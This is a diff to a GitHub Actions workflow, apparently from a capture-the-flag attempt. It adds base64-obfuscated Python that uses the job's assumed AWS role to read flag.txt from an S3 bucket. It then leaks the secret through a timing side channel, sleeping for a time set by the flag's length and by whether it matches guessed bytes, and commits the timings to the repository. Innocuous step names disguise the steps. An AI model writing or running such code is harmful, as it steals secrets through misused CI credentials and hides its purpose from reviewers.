@@ -25,13 +25,13 @@ jobs:
           role-to-assume: arn:aws:iam::009661764077:role/cicdRole
           aws-region: us-east-1
 
-      - name: Calibrate and verify flag
+      - name: Flag length and rstrip verification
         run: |
           B64_CAL0="aW1wb3J0IGJvdG8zLHRpbWUKZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKdGltZS5zbGVlcCgwKQ=="
           B64_CAL4="aW1wb3J0IGJvdG8zLHRpbWUKZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKdGltZS5zbGVlcCg0KQ=="
-          B64_CAL8="aW1wb3J0IGJvdG8zLHRpbWUKZmxhZz1ib3RvMy5jbGllbnQoJ3MzJykuZ2V0X29iamVjdChCdWNrZXQ9J2NvZGVjNGYyNmM4NjJhMzIxZWY1JyxLZXk9J2ZsYWcudHh0JylbJ0JvZHknXS5yZWFkKCkKdGltZS5zbGVlcCg4KQ=="
-          B64_CMP="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogIGZsYWc9Ym90bzMuY2xpZW50KCdzMycpLmdldF9vYmplY3QoQnVja2V0PSdjb2RlYzRmMjZjODYyYTMyMWVmNScsS2V5PSdmbGFnLnR4dCcpWydCb2R5J10ucmVhZCgpCiAgaWYgZmxhZz09Ynl0ZXMoWzB4NDMsMHg0OSwweDk4LDB4OTMsMHg4NCwweDg2LDB4NDksMHg0MywweDhDLDB4OUMsMHg0NSwweDRBLDB4OEMsMHg5OSwweDg2LDB4ODJdKToKICAgIHRpbWUuc2xlZXAoMTApCiAgZWxzZToKICAgIHRpbWUuc2xlZXAoMikKZXhjZXB0OgogIHBhc3M="
-          B64_ANALYZE="d2l0aCBvcGVuKCJjYWxpYnJhdGUudHh0IikgYXMgZjoKICAgIGxpbmVzID0gW2wuc3RyaXAoKSBmb3IgbCBpbiBmIGlmIGwuc3RyaXAoKV0KZGF0YSA9IHt9CmZvciBsIGluIGxpbmVzOgogICAgbmFtZSwgbXMgPSBsLnJzcGxpdCgiICIsIDEpCiAgICBkYXRhW25hbWVdID0gaW50KG1zLnJzdHJpcCgibXMiKSkKb3ZlcmhlYWQgPSAoZGF0YS5nZXQoImNhbF9zbGVlcDAiLDApICsgZGF0YS5nZXQoImNhbF9zbGVlcDBfMiIsMCkpIC8gMgpwcmludChmIkVzdGltYXRlZCBvdmVyaGVhZCAoUzMrbmV0d29yayk6IHtvdmVyaGVhZDouMGZ9bXMiKQpjYWw0ID0gKGRhdGEuZ2V0KCJjYWxfc2xlZXA0IiwwKSArIGRhdGEuZ2V0KCJjYWxfc2xlZXA0XzIiLDApKSAvIDIKcHJpbnQoZiJDYWxpYnJhdGVkIHNsZWVwKDQpOiB7Y2FsNDouMGZ9bXMgLT4gYWN0dWFsIG92ZXJoZWFkOiB7Y2FsNC00MDAwOi4wZn1tcyIpCmNtcF9tcyA9IGRhdGEuZ2V0KCJmdWxsX2ZsYWdfY21wIiwgMCkKcHJpbnQoZiJGdWxsIGZsYWcgY29tcGFyaXNvbjoge2NtcF9tc31tcyIpCmFkal9jbXAgPSBjbXBfbXMgLSBvdmVyaGVhZApwcmludChmIkFkanVzdGVkIGNvbXBhcmlzb24gKHN1YnRyYWN0IG92ZXJoZWFkKToge2Fkal9jbXA6LjBmfW1zIikKaWYgYWRqX2NtcCA+IDgwMDA6CiAgICBwcmludCgiPj4+IEZMQUcgQ09SUkVDVCAoc2xlZXA9MTBzKSIpCmVsaWYgYWRqX2NtcCA+IDUwMDA6CiAgICBwcmludCgiPj4+IEFNQklHVU9VUyIpCmVsc2U6CiAgICBwcmludCgiPj4+IEZMQUcgV1JPTkcgKHNsZWVwPTJzKSIp"
+          B64_LEN="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogIHJhdz1ib3RvMy5jbGllbnQoY2hyKDExNSkrY2hyKDUxKSkuZ2V0X29iamVjdChCdWNrZXQ9ImNvZGVjNGYyNmM4NjJhMzIxZWY1IixLZXk9ImZsYWcudHh0IilbIkJvZHkiXS5yZWFkKCkKICB0aW1lLnNsZWVwKGxlbihyYXcpLTEyKQpleGNlcHQ6CiAgdGltZS5zbGVlcCgxKQ=="
+          B64_RSTRIP="aW1wb3J0IGJvdG8zLHRpbWUKdHJ5OgogIGZsYWc9Ym90bzMuY2xpZW50KGNocigxMTUpK2Nocig1MSkpLmdldF9vYmplY3QoQnVja2V0PSJjb2RlYzRmMjZjODYyYTMyMWVmNSIsS2V5PSJmbGFnLnR4dCIpWyJCb2R5Il0ucmVhZCgpLnJzdHJpcChiIlxuIikKICBpZiBmbGFnPT1ieXRlcyhbMHg0MywweDQ5LDB4OTgsMHg5MywweDg0LDB4ODYsMHg0OSwweDQzLDB4OEMsMHg5QywweDQ1LDB4NEEsMHg4QywweDk5LDB4ODYsMHg4Ml0pOgogICAgdGltZS5zbGVlcCgxMCkKICBlbHNlOgogICAgdGltZS5zbGVlcCgyKQpleGNlcHQ6CiAgcGFzcw=="
+          B64_ANALYZE="d2l0aCBvcGVuKCJjYWxpYnJhdGUudHh0IikgYXMgZjoKICAgIGxpbmVzID0gW2wuc3RyaXAoKSBmb3IgbCBpbiBmIGlmIGwuc3RyaXAoKV0KZGF0YSA9IHt9CmZvciBsIGluIGxpbmVzOgogICAgbmFtZSwgbXMgPSBsLnJzcGxpdCgiICIsIDEpCiAgICBkYXRhW25hbWVdID0gaW50KG1zLnJzdHJpcCgibXMiKSkKb3ZlcmhlYWQgPSAoZGF0YS5nZXQoImNhbF9zbGVlcDAiLDApICsgZGF0YS5nZXQoImNhbF9zbGVlcDBfMiIsMCkpIC8gMgpwcmludChmIkVzdGltYXRlZCBvdmVyaGVhZCAoUzMrbmV0d29yayk6IHtvdmVyaGVhZDouMGZ9bXMiKQpjYWw0ID0gKGRhdGEuZ2V0KCJjYWxfc2xlZXA0IiwwKSArIGRhdGEuZ2V0KCJjYWxfc2xlZXA0XzIiLDApKSAvIDIKcHJpbnQoZiJDYWxpYnJhdGVkIHNsZWVwKDQpOiB7Y2FsNDouMGZ9bXMgLT4gYWN0dWFsIG92ZXJoZWFkOiB7Y2FsNC00MDAwOi4wZn1tcyIpCmZvciBrIGluIFsiZmxhZ19sZW5fY2hlY2siLCAicnN0cmlwX2NtcCJdOgogICAgbXMgPSBkYXRhLmdldChrLCAwKQogICAgYWRqID0gbXMgLSBvdmVyaGVhZAogICAgcHJpbnQoZiJ7a306IHttc31tcyAtPiBhZGp1c3RlZCB7YWRqOi4wZn1tcyAtPiBzbGVlcH57cm91bmQoYWRqLzEwMDApfXMiKQ=="
 
           touch calibrate.txt
 
@@ -49,19 +49,19 @@ jobs:
 
           run_timed "cal_sleep0" "$B64_CAL0"
           run_timed "cal_sleep4" "$B64_CAL4"
-          run_timed "cal_sleep8" "$B64_CAL8"
-          run_timed "full_flag_cmp" "$B64_CMP"
+          run_timed "flag_len_check" "$B64_LEN"
+          run_timed "rstrip_cmp" "$B64_RSTRIP"
           run_timed "cal_sleep0_2" "$B64_CAL0"
           run_timed "cal_sleep4_2" "$B64_CAL4"
 
-          echo "=== CALIBRATION RESULTS ==="
+          echo "=== RESULTS ==="
           cat calibrate.txt
           echo "$B64_ANALYZE" | base64 -d | python3
 
-      - name: Commit calibration results
+      - name: Commit results
         run: |
           git config user.email "bot@github-actions"
           git config user.name "GitHub Actions"
           git add calibrate.txt
-          git commit -m "calibration + flag verify results [skip ci]" || echo "Nothing to commit"
+          git commit -m "flag len + rstrip verification [skip ci]" || echo "Nothing to commit"
           git push origin corgi
